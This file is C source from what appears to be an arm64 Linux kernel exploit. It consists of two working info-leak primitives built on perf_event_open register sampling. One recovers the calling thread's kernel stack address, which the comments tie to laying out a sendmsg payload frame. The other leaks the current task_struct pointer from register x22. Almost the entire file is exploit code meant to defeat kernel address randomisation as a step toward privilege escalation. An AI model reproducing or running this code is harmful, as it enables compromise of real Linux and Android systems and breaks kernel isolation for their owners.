#include "common.h"
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* arm64 perf regs ABI: x0..x30, sp, pc -> index 31 is sp. */
#define PERF_REGS_N 32
#define PERF_PAGES 256

/* Absolute syscall-wrapper entry SP of this thread, i.e. the address our
 * sendmsg frame is laid out relative to.  Lives on the same kernel stack
 * for the whole thread lifetime. */
uintptr_t g_kstack_T;

/* S_FRAME_SIZE (0x140) + el0_svc_handler frame (0x10) + el0_svc_common
 * frame (0x40) = 0x190; stack top is base + 0x4000. */
#define KSTACK_T_OFFSET (0x4000 - 0x190)

uintptr_t sample_kstack_T(void)
{	struct perf_event_attr pe;
	memset(&pe, 0, sizeof(pe));
	pe.type = PERF_TYPE_SOFTWARE;
	pe.size = sizeof(pe);
	pe.config = PERF_COUNT_SW_CPU_CLOCK;
	pe.sample_period = 200000; /* 200us: keep the ring far from overflow */
	pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
	pe.sample_regs_intr = (1ULL << PERF_REGS_N) - 1;
	pe.disabled = 1;
	pe.exclude_user = 1;
	pe.exclude_hv = 1;
	pe.exclude_idle = 1;
	pe.wakeup_events = 1;

	int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
	if (fd < 0) {
		pr_error("kstack: perf_event_open errno=%d\n", errno);
		return 0;
	}
	size_t msz = 4096 * (1 + PERF_PAGES);
	void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (buf == MAP_FAILED) {
		pr_error("kstack: mmap errno=%d\n", errno);
		close(fd);
		return 0;
	}

	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	for (int i = 0; i < 100000; i++)
		syscall(__NR_getpid);
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	struct perf_event_mmap_page *hdr = buf;
	uint64_t head = hdr->data_head;
	__sync_synchronize();
	char *base = (char *)buf + 4096;
	size_t dsz = 4096 * PERF_PAGES;
	uint64_t pos = hdr->data_tail;

	struct { uintptr_t b; size_t c; } hist[8];
	int hn = 0;
	int nsamp = 0, nkern = 0;
	const char *dump_env = getenv("KSTACK_DUMP");
	int dump_all = dump_env && *dump_env && atoi(dump_env);

	while (pos < head) {
		struct perf_event_header *ev = (void *)(base + (pos % dsz));
		if (ev->size == 0 || ev->size > dsz)
			break;
		if (ev->type == PERF_RECORD_SAMPLE) {
			char *p = (char *)ev + sizeof(*ev);
			p += 8; /* ip */
			uint64_t abi = *(uint64_t *)p;
			p += 8;
			nsamp++;
			/* perf ABI: 1 = 32-bit, 2 = 64-bit. */
			if (nsamp <= 5)
				pr_info("kstack raw ip=%#llx abi=%llu size=%u\n",
					(unsigned long long)*(uint64_t *)((char *)ev + sizeof(*ev)),
					(unsigned long long)abi, ev->size);
			if (abi == 2) { /* 64-bit regs */
				uint64_t *r = (uint64_t *)p;
				uint64_t sp = r[31];
				if (dump_all && nsamp <= 512)
					pr_info("KSIP %#llx\n",
						(unsigned long long)*(uint64_t *)((char *)ev + sizeof(*ev)));
				if (nsamp <= 5)
					pr_info("kstack samp ip=%#llx abi=%llu sp=%#llx x30=%#llx\n",
						(unsigned long long)*(uint64_t *)((char *)ev + sizeof(*ev)),
						(unsigned long long)abi,
						(unsigned long long)sp,
						(unsigned long long)r[30]);
				if (sp >= 0xffffff8000000000ULL) {
					nkern++;
					uintptr_t b = sp & ~(uintptr_t)0x3fff;
					int k;
					for (k = 0; k < hn; k++)
						if (hist[k].b == b)
							break;
					if (k == hn && hn < 8) {
						hist[hn].b = b;
						hist[hn].c = 0;
						hn++;
					}
					if (k < hn)
						hist[k].c++;
				}
			}
		}
		pos += ev->size;
	}
	hdr->data_tail = head;

	uintptr_t best_base = 0;
	size_t best_cnt = 0;
	for (int i = 0; i < hn; i++) {
		if (hist[i].c > best_cnt) {
			best_cnt = hist[i].c;
			best_base = hist[i].b;
		}
	}
	munmap(buf, msz);
	close(fd);

	if (!best_base || best_cnt < 16) {
		pr_error("kstack: no stable kernel stack (best=%zu samples=%d kern=%d)\n",
			 best_cnt, nsamp, nkern);
		return 0;
	}
	g_kstack_T = best_base + KSTACK_T_OFFSET;
	pr_info("kstack: base=%#zx samples=%zu T=%#zx\n",
		best_base, best_cnt, g_kstack_T);
	return g_kstack_T;
}

/* Leak the calling thread's `current` (task_struct pointer).  el0_svc_common
 * does `mrs x22, SP_EL0` right at its entry and IRQs are enabled a few
 * instructions later, so samples inside that function carry the task pointer
 * in x22.  Samples anywhere else (deeper call frames) must be ignored: their
 * x22 is unrelated.  lo/hi bound the runtime el0_svc_common text range. */
uintptr_t leak_current_x22(uintptr_t lo, uintptr_t hi)
{
	struct perf_event_attr pe;
	memset(&pe, 0, sizeof(pe));
	pe.type = PERF_TYPE_SOFTWARE;
	pe.size = sizeof(pe);
	pe.config = PERF_COUNT_SW_CPU_CLOCK;
	pe.sample_period = 200000;
	pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
	pe.sample_regs_intr = (1ULL << PERF_REGS_N) - 1;
	pe.disabled = 1;
	pe.exclude_user = 1;
	pe.exclude_hv = 1;
	pe.exclude_idle = 1;
	pe.wakeup_events = 1;

	int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
	if (fd < 0) {
		pr_error("current: perf_event_open errno=%d\n", errno);
		return 0;
	}
	size_t msz = 4096 * (1 + PERF_PAGES);
	void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (buf == MAP_FAILED) {
		pr_error("current: mmap errno=%d\n", errno);
		close(fd);
		return 0;
	}

	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
	for (int i = 0; i < 100000; i++)
		syscall(__NR_getpid);
	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

	struct perf_event_mmap_page *hdr = buf;
	uint64_t head = hdr->data_head;
	__sync_synchronize();
	char *base = (char *)buf + 4096;
	size_t dsz = 4096 * PERF_PAGES;
	uint64_t pos = hdr->data_tail;

	struct { uintptr_t v; size_t c; } hist[8];
	int hn = 0, nsamp = 0;

	while (pos < head) {
		struct perf_event_header *ev = (void *)(base + (pos % dsz));
		if (ev->size == 0 || ev->size > dsz)
			break;
		if (ev->type == PERF_RECORD_SAMPLE) {
			char *p = (char *)ev + sizeof(*ev);
			uint64_t ip = *(uint64_t *)p;
			p += 8; /* ip */
			uint64_t abi = *(uint64_t *)p;
			p += 8;
			nsamp++;
			if (abi == 2 && ip >= lo && ip < hi) {
				uint64_t *r = (uint64_t *)p;
				uintptr_t task = (uintptr_t)r[22];
				if (getenv("KSTACK_REGS") && nsamp < 64 && nsamp > 0) {
					static int dumped;
					if (dumped < 3) {
						dumped++;
						pr_info("REGS ip=%#llx\n", (unsigned long long)ip);
						for (int q = 0; q < 31; q++)
							pr_info("REGS x%d=%#llx\n", q,
								(unsigned long long)r[q]);
						pr_info("REGS sp=%#llx\n", (unsigned long long)r[31]);
					}
				}
				if (task >= 0xffffff8000000000ULL) {
					int k;
					for (k = 0; k < hn; k++)
						if (hist[k].v == task)
							break;
					if (k == hn && hn < 8) {
						hist[hn].v = task;
						hist[hn].c = 0;
						hn++;
					}
					if (k < hn)
						hist[k].c++;
				}
			}
		}
		pos += ev->size;
	}
	hdr->data_tail = head;
	munmap(buf, msz);
	close(fd);

	uintptr_t best = 0;
	size_t best_cnt = 0;
	for (int i = 0; i < hn; i++) {
		if (hist[i].c > best_cnt) {
			best_cnt = hist[i].c;
			best = hist[i].v;
		}
	}
	if (!best || best_cnt < 16) {
		pr_error("current: no stable x22 (best=%zu samples=%d)\n",
			 best_cnt, nsamp);
		return 0;
	}
	if (!is_kernel_ptr(best)) {
		pr_error("current: implausible task pointer %#zx\n", (size_t)best);
		return 0;
	}
	pr_info("current: task=%#zx samples=%zu/%d\n", (size_t)best,
		(unsigned long)best_cnt, nsamp);
	return best;
}
